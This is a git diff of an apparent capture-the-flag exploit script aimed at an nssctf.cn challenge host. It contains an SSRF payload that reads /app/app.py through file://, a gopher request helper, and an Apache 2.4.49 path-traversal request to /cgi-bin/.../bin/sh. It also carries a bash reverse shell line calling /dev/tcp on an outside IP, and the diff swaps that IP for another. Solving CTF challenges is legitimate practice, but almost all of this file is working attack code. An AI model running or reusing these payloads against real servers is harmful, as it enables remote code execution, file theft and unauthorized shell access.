@@ -1,6 +1,6 @@
 import requests
 from urllib.parse import quote
-url = "http://node5.anna.nssctf.cn:20565/"
+url = "http://node5.anna.nssctf.cn:22243/"
 
 def get_resource_code():
     payload = "?url=file:///app/app.py"
@@ -24,7 +24,7 @@ def gopher_request():
     print(response.request.url)
     print(response.text)
 def gopher_apache_2_4_49_exp():
-    command = '''bash -c "bash -i >& /dev/tcp/59.xx.xx.238/1234 0>&1"'''
+    command = '''bash -c "bash -i >& /dev/tcp/123.57.48.91/2333 0>&1"'''
     command = "cd /;python3 -m http.server 8082"
     request_payload = \
 f"""POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
@@ -53,8 +53,8 @@ def readfile():
     print(response.request.url)
     print(response.text)
 
-gopher_apache_2_4_49_exp()
-# readfile()
+#gopher_apache_2_4_49_exp()
+readfile()
 
 
 
